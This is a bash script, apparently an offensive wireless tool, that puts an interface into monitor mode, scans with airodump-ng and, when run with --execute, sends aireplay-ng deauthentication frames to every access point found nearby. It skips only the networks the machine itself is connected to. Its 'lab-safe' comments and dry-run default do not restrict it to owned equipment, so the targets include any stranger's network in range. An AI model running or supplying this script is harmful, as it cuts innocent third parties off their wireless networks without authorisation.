#!/usr/bin/env bash
# Usage: sudo ./safe_monitor_deauth.sh <iface> <airodump_seconds> <outdir> [--execute]
# Example dry-run (default): sudo ./safe_monitor_deauth.sh wlan1 20 ./out
# Example execute: sudo ./safe_monitor_deauth.sh wlan1 20 ./out --execute
set -euo pipefail

IFACE="${1:-wlan1}"
DUR="${2:-20}"
OUTDIR="${3:-./airodump_out}"
EXECUTE=false
if [ "${4:-}" = "--execute" ]; then EXECUTE=true; fi

MON_IFACE="mon0"        # monitor interface we will create (if supported)
DEAUTH_COUNT=10         # finite number of deauths per AP (lab-safe)
PREFIX="scan"

mkdir -p "$OUTDIR"
LOGFILE="$OUTDIR/log.log"

echo "[*] IFACE: $IFACE"
echo "[*] Duration: ${DUR}s"
echo "[*] Outdir: $OUTDIR"
echo "[*] Monitor iface: $MON_IFACE"
echo "[*] Execute mode: $EXECUTE"

# 1) Build a skip-list of currently-associated BSSIDs from all managed interfaces
echo "[*] discovering currently-associated BSSIDs (will not target these)..."
SKIP_BSSIDS=""
for i in $(ls /sys/class/net | grep -v lo); do
  # try iw
  if command -v iw >/dev/null 2>&1; then
    assoc="$(iw dev "$i" link 2>/dev/null | awk '/Connected to/ {print $3}')" || true
    if [ -n "$assoc" ] && [ "$assoc" != "00:00:00:00:00:00" ]; then
      SKIP_BSSIDS="$SKIP_BSSIDS $assoc"
    fi
  fi
done
SKIP_BSSIDS="$(echo $SKIP_BSSIDS | tr '[:upper:]' '[:lower:]' | xargs -n1 | sort -u | xargs)"
if [ -n "$SKIP_BSSIDS" ]; then
  echo "[!] Will skip these associated BSSIDs: $SKIP_BSSIDS"
else
  echo "[*] No associated BSSIDs detected."
fi

# 2) Create a monitor interface (does NOT kill NetworkManager)
if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo "[*] Creating monitor interface $MON_IFACE on same PHY as $IFACE..."
  # Try modern 'iw' interface add - preferred
  if command -v iw >/dev/null 2>&1; then
    if sudo iw dev "$IFACE" interface add "$MON_IFACE" type monitor 2>/dev/null; then
      sudo ip link set "$MON_IFACE" up
      echo "[*] Created $MON_IFACE successfully."
    else
      echo "[!] Failed to create monitor interface via 'iw'. Falling back to setting $IFACE to monitor (CAUTION)."
      echo "[!] This fallback may break NetworkManager and disconnect SSH."
      # fallback: set the real iface to monitor - DO NOT run airmon-ng check kill
      sudo ip link set "$IFACE" down || true
      sudo iw dev "$IFACE" set type monitor || true
      sudo ip link set "$IFACE" up || true
      MON_IFACE="$IFACE"
      sleep 1
    fi
  else
    echo "[!] 'iw' not available — attempting to set $IFACE into monitor mode (CAUTION)."
    sudo ip link set "$IFACE" down || true
    sudo iwconfig "$IFACE" mode monitor || true
    sudo ip link set "$IFACE" up || true
    MON_IFACE="$IFACE"
    sleep 1
  fi
else
  echo "[*] Monitor interface $MON_IFACE already exists — using it."
fi

echo "[*] Using monitor interface: $MON_IFACE"

# 3) Run airodump-ng (on monitor iface) to capture CSV
CAP_PREFIX="$OUTDIR/${PREFIX}"
CSV_FILE="${CAP_PREFIX}-01.csv"

echo "[*] running airodump-ng for $DUR seconds (writing to $CAP_PREFIX-*) on $MON_IFACE"
sudo timeout "$DUR" airodump-ng --write "$CAP_PREFIX" --output-format csv "$MON_IFACE" >/dev/null 2>&1 || true

if [ ! -f "$CSV_FILE" ]; then
  echo "ERROR: CSV not found at $CSV_FILE — aborting."
  ls -l "$OUTDIR"
  exit 1
fi

# 4) Parse CSV for AP BSSIDs
AP_LIST=$(awk -F',' '
  BEGIN { mac_re="^[0-9A-Fa-f:]{17}$" }
  $1 ~ mac_re && $0 !~ /Station MAC/ { gsub(/^[ \t]+|[ \t]+$/,"",$1); print tolower($1) }
' "$CSV_FILE" | sort -u)

if [ -z "$AP_LIST" ]; then
  echo "[!] no APs found in CSV (or parsing failed)."
  exit 0
fi

echo "=== Targets found ($(echo "$AP_LIST" | wc -l) APs) ==="
echo "$AP_LIST"
echo "loop run at $(date)" >> "$LOGFILE"

# 5) Attack loop: skip associated BSSIDs; dry-run unless --execute
for bssid in $AP_LIST; do
  [ -z "$bssid" ] && continue
  if echo "$SKIP_BSSIDS" | grep -qi "\b${bssid}\b"; then
    echo "[skip] $bssid is associated to a managed interface — skipping (protecting SSH/test links)."
    echo "$(date +'%F %T') | SKIP BSSID=$bssid" >> "$LOGFILE"
    continue
  fi
  if [ "$bssid" = "ff:ff:ff:ff:ff:ff" ] || [ "$bssid" = "00:00:00:00:00:00" ]; then
    echo "[skip] broadcast/invalid bssid: $bssid"
    continue
  fi

  echo "Would target BSSID: $bssid (deauth count: $DEAUTH_COUNT) via $MON_IFACE"
  echo "$(date +'%F %T') | BSSID=$bssid" >> "$LOGFILE"

  if [ "$EXECUTE" = true ]; then
    echo "[*] Executing aireplay-ng --deauth $DEAUTH_COUNT -a $bssid $MON_IFACE"
    sudo aireplay-ng --deauth "$DEAUTH_COUNT" -a "$bssid" "$MON_IFACE" || {
      echo "[!] aireplay-ng failed for $bssid (see logs)."
      echo "$(date +'%F %T') | ERROR BSSID=$bssid" >> "$LOGFILE"
    }
  else
    echo "[dry-run] not executing aireplay-ng. Re-run with --execute to perform action."
  fi

  sleep 0.5
done

echo "[*] done. Check $LOGFILE and $CSV_FILE"
